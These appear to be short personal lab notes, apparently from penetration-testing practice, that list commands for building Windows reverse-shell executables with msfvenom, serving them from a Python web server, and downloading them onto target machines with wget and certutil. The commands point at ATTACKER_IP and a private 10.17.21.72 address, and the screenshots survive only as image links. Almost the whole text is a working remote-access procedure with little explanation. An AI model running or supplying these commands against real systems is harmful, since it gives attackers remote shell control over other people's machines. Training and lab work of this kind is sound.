
Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

KaliLinux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Powershell / Linux

```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

CMD

```bash
certutil -urlcache -f http://10.17.21.72:9000/shell.exe Wservice.exe
```

---
### Linux

Attackbox - (Ensure that attackbox is also on same network)
![[Pasted image 20250909113540.png]]

Targetbox - 
![[Pasted image 20250909113605.png]]

---
### Windows

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.17.21.72 LPORT=8080 -f exe > shell.exe
```

![[Pasted image 20250910031237.png]]

Powershell

```bash
wget http://10.17.21.72:9000/shell.exe -O shell.exe
```

![[Pasted image 20250910031337.png]]

CMD

```bash
certutil -urlcache -f http://10.17.21.72:9000/shell.exe Wservice.exe
```

![[Pasted image 20250910162357.png]]